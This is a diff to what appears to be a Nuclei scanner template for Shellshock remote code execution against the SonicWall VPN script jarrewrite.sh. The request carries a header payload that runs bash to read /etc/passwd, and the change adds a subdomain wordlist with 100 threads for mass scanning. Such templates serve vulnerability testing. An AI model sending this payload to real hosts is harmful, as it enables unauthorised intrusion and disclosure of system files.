@@ -10,20 +10,24 @@ info:
   tags: shellshock,sonicwall,rce,vpn
 
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         GET /cgi-bin/jarrewrite.sh HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
         User-Agent: "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"
         Accept: */*
         Accept-Language: en
         Connection: close
-
     matchers-condition: and
     matchers:
       - type: regex
         regex:
-          - "root:[x*]:0:0"
+          - "root:.*:0:0"
         part: body
       - type: status
         status:
